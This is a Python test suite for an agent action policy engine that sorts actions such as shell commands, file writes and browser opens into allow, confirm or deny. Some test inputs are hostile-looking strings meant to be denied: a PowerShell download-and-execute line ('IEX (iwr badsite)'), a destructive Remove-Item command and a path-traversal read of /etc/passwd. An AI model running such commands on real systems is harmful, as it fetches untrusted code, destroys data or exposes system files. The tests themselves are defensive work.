"""
Action Safety Layer - Policy Engine Tests (S1-S15)

Tests the allow/confirm/deny classification matrix, rule priority,
default verdict, arg pattern matching, mode filtering, and audit log.
"""

import sys
sys.path.insert(0, r"S:\services\openclaw")

from app.policy_engine import (
    ActionVerdict,
    PolicyDecision,
    PolicyRule,
    PolicyEngine,
    default_safety_rules,
)

passed = 0
failed = 0

def check(tid, cond, msg=""):
    global passed, failed
    if cond:
        passed += 1
        print(f"  [PASS] {tid}: {msg}")
    else:
        failed += 1
        print(f"  [FAIL] {tid}: {msg}")

print("=" * 60)
print("Test Suite: Policy Engine (S1-S15)")
print("=" * 60)

# -- S1: Verdict enum completeness --
print("\n--- S1: Verdict enum ---")
check("S1a", len(ActionVerdict) == 3, "3 verdicts")
check("S1b", set(v.value for v in ActionVerdict) == {"allow", "confirm", "deny"}, "Values correct")

# -- S2: Rule action matching (exact) --
print("\n--- S2: Action matching ---")
r = PolicyRule(name="r", verdict=ActionVerdict.ALLOW, action_pattern=r"shell\.run")
check("S2a", r.matches("shell.run", {}, {}), "Exact match")
check("S2b", r.matches("SHELL.RUN", {}, {}), "Case insensitive match (uppercase)")
check("S2c", r.matches("Shell.Run", {}, {}), "Case insensitive match (mixed)")
check("S2d", not r.matches("shell.run.x", {}, {}), "Fullmatch rejects suffix")

# -- S3: Rule arg patterns --
print("\n--- S3: Arg patterns ---")
r = PolicyRule(name="r", verdict=ActionVerdict.DENY,
    action_pattern=r"shell\.run",
    arg_patterns={"command": r"(?i)Remove-Item"})
check("S3a", r.matches("shell.run", {"command": "Remove-Item X"}, {}), "Arg matches")
check("S3b", r.matches("shell.run", {"command": "remove-item X"}, {}), "Arg case insensitive")
check("S3c", not r.matches("shell.run", {"command": "Get-ChildItem"}, {}), "Arg mismatch")

# -- S4: Rule mode filter --
print("\n--- S4: Mode filter ---")
r = PolicyRule(name="r", verdict=ActionVerdict.CONFIRM, action_pattern=r".*",
    mode_filter={"conversation"})
check("S4a", r.matches("any", {}, {"mode": "conversation"}), "Mode match")
check("S4b", not r.matches("any", {}, {"mode": "operator"}), "Mode excluded")

# -- S5: Engine default verdict --
print("\n--- S5: Default verdict ---")
engine = PolicyEngine(rules=[], default_verdict=ActionVerdict.DENY)
d = engine.evaluate("unknown.action", trace_id="s5")
check("S5a", d.verdict == ActionVerdict.DENY, "Default DENY")
check("S5b", d.rule_name == "__default__", "Rule name = __default__")

# -- S6: First-match-wins ordering --
print("\n--- S6: First match wins ---")
engine = PolicyEngine(rules=[
    PolicyRule(name="first", verdict=ActionVerdict.ALLOW, action_pattern=r".*", priority=10),
    PolicyRule(name="second", verdict=ActionVerdict.DENY, action_pattern=r".*", priority=20),
])
d = engine.evaluate("x", trace_id="s6")
check("S6a", d.verdict == ActionVerdict.ALLOW, "First wins")
check("S6b", d.rule_name == "first", "Matched first")

# -- S7: Priority ordering --
print("\n--- S7: Priority ordering ---")
engine = PolicyEngine(rules=[
    PolicyRule(name="low", verdict=ActionVerdict.ALLOW, action_pattern=r".*", priority=99),
    PolicyRule(name="high", verdict=ActionVerdict.DENY, action_pattern=r".*", priority=1),
])
d = engine.evaluate("x", trace_id="s7")
check("S7a", d.verdict == ActionVerdict.DENY, "Higher priority wins")

# -- S8: Audit log recording --
print("\n--- S8: Audit log ---")
engine = PolicyEngine(rules=[
    PolicyRule(name="r", verdict=ActionVerdict.ALLOW, action_pattern=r".*"),
])
engine.evaluate("a1", trace_id="s8a")
engine.evaluate("a2", trace_id="s8b")
check("S8a", engine.decision_count == 2, "2 decisions")
check("S8b", engine.recent_decisions(1)[0]["trace_id"] == "s8b", "Most recent")

# -- S9: Rule add/remove --
print("\n--- S9: Rule management ---")
engine = PolicyEngine()
engine.add_rule(PolicyRule(name="x", verdict=ActionVerdict.DENY, action_pattern=r".*"))
check("S9a", engine.rule_count == 1, "Added")
engine.remove_rule("x")
check("S9b", engine.rule_count == 0, "Removed")

# -- S10: Default safety rules -- DENY destructive shell --
print("\n--- S10: Deny destructive ---")
engine = PolicyEngine(rules=default_safety_rules())
d = engine.evaluate("shell.run", args={"command": "Remove-Item S:\\foo"}, trace_id="s10a")
check("S10a", d.verdict == ActionVerdict.DENY, "Remove-Item denied")
d = engine.evaluate("shell.run", args={"command": "IEX (iwr badsite)"}, trace_id="s10b")
check("S10b", d.verdict == ActionVerdict.DENY, "IEX denied")

# -- S11: Default safety rules -- DENY path escape --
print("\n--- S11: Deny path escape ---")
d = engine.evaluate("file.write", args={"path": "C:\\evil.txt"}, trace_id="s11a")
check("S11a", d.verdict == ActionVerdict.DENY, "C:\\ denied")
d = engine.evaluate("file.read", args={"path": "..\\..\\etc\\passwd"}, trace_id="s11b")
check("S11b", d.verdict == ActionVerdict.DENY, ".. escape denied")

# -- S12: Default safety rules -- ALLOW readonly --
print("\n--- S12: Allow readonly ---")
d = engine.evaluate("shell.run", args={"command": "Get-ChildItem S:\\"}, trace_id="s12a")
check("S12a", d.verdict == ActionVerdict.ALLOW, "Get-ChildItem allowed")
d = engine.evaluate("file.read", args={"path": "S:\\config\\x.json"}, trace_id="s12b")
check("S12b", d.verdict == ActionVerdict.ALLOW, "file.read allowed")

# -- S13: Default safety rules -- CONFIRM writes --
print("\n--- S13: Confirm writes ---")
d = engine.evaluate("file.write", args={"path": "S:\\tmp\\x.txt"}, trace_id="s13a")
check("S13a", d.verdict == ActionVerdict.CONFIRM, "file.write confirm")
d = engine.evaluate("browser.open", args={"url": "https://x.com"}, trace_id="s13b")
check("S13b", d.verdict == ActionVerdict.CONFIRM, "browser.open confirm")

# -- S14: PolicyDecision serialisation --
print("\n--- S14: Decision serialisation ---")
d = engine.evaluate("file.read", args={"path": "S:\\x"}, trace_id="s14")
dd = d.to_dict()
check("S14a", dd["verdict"] == "allow", "Verdict serialised")
check("S14b", dd["trace_id"] == "s14", "Trace ID")
check("S14c", "timestamp" in dd, "Timestamp present")

# -- S15: Args truncation --
print("\n--- S15: Args truncation ---")
d = engine.evaluate("file.write", args={"content": "x" * 200, "path": "S:\\tmp\\x"}, trace_id="s15")
check("S15a", len(str(d.args_summary.get("content", ""))) <= 121, "Truncated")

# -- Summary --
print("\n" + "=" * 60)
total = passed + failed
print(f"Results: {passed}/{total} passed")
if failed:
    print("SOME TESTS FAILED")
    sys.exit(1)
else:
    print("ALL TESTS PASSED")
    sys.exit(0)
